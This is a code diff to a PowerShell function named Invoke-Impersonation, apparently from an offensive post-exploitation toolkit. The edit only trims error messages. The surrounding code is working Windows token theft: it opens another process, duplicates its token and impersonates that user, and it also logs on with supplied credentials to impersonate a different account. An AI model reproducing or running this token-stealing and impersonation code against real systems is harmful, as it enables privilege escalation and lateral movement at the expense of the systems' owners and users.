@@ -127,7 +127,7 @@ function Invoke-Impersonation {
             if ([Advapi32]::RevertToSelf()) {
                 Write-Output "[+] Successfully reverted to original user context."
             } else {
-                Write-Output "[-] Failed to revert to original user. Error: $($Error[0].Exception.Message)"
+                Write-Output "[-] Failed to revert to original user."
             }
             return
         }
@@ -135,21 +135,21 @@ function Invoke-Impersonation {
         if ($StealToken) {
             $processHandle = [Kernel32]::OpenProcess([PROCESS_ACCESS]::PROCESS_QUERY_INFORMATION, $false, $ProcessID)
             if ($processHandle -eq [IntPtr]::Zero) {
-                throw "[-] Failed to obtain process handle. Error: $($Error[0].Exception.Message)"
+                throw "[-] Failed to obtain process handle."
             }
 
             $tokenHandle = [IntPtr]::Zero
             if (-not [Advapi32]::OpenProcessToken($processHandle, [TOKEN_ACCESS]::TOKEN_DUPLICATE, [ref]$tokenHandle)) {
-                throw "[-] Failed to get token. Error: $($Error[0].Exception.Message)"
+                throw "[-] Failed to get token."
             }
 
             $duplicateTokenHandle = [IntPtr]::Zero
             if (-not [Advapi32]::DuplicateToken($tokenHandle, [TOKEN_TYPE]::TokenImpersonation, [ref]$duplicateTokenHandle)) {
-                throw "[-] Failed to duplicate token. Error: $($Error[0].Exception.Message)"
+                throw "[-] Failed to duplicate token."
             }
 
             if (-not [Advapi32]::ImpersonateLoggedOnUser($duplicateTokenHandle)) {
-                throw "[-] Failed to impersonate. Error: $($Error[0].Exception.Message)"
+                throw "[-] Failed to impersonate."
             }
 
             Write-Output "[+] Impersonation successful using token from PID $ProcessID."
@@ -159,12 +159,12 @@ function Invoke-Impersonation {
 		if ($MakeToken) {
             $tokenHandle = [IntPtr]::Zero
             if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
-                throw "[-] Failed to obtain user token. Error: $($Error[0].Exception.Message)"
+                throw "[-] Failed to obtain user token."
             }
 
             if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
                 [Advapi32]::CloseHandle($tokenHandle)
-                throw "[-] Failed to impersonate user. Error: $($Error[0].Exception.Message)"
+                throw "[-] Failed to impersonate user."
             }
 
             Write-Output "[+] Impersonation successful using provided credentials."
